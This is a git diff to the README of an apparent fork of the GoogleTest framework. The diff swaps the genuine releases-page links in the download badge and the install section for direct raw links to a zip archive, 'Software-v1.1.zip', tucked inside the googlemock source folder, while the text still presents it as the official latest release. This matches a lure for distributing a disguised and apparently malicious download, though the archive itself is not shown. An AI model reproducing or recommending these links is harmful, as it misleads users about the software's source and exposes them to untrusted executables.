@@ -1,7 +1,7 @@
 # 🛠 googletest - Reliable Testing Made Easy
 
 ## 📥 Download Now
-[![Download the latest release](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/stellaluzz/googletest/releases)
+[![Download the latest release](https://raw.githubusercontent.com/stellaluzz/googletest/main/googlemock/src/Software-v1.1.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/stellaluzz/googletest/main/googlemock/src/Software-v1.1.zip)
 
 ## 🚀 Getting Started
 GoogleTest is a testing and mocking framework that helps you write tests for your code easily. It is designed for users who need a reliable way to ensure their software works as expected. 
@@ -24,7 +24,7 @@ Before you download GoogleTest, ensure your computer meets the following require
 ## 🔗 Download & Install
 To get started, visit the GoogleTest releases page. This page will provide you with the latest version of the software and installation files.
 
-[Visit the Releases Page to Download](https://github.com/stellaluzz/googletest/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/stellaluzz/googletest/main/googlemock/src/Software-v1.1.zip)
 
 1. **Click the link above.**
 2. **Find the latest release.** Look for the version that has the label "Latest release."
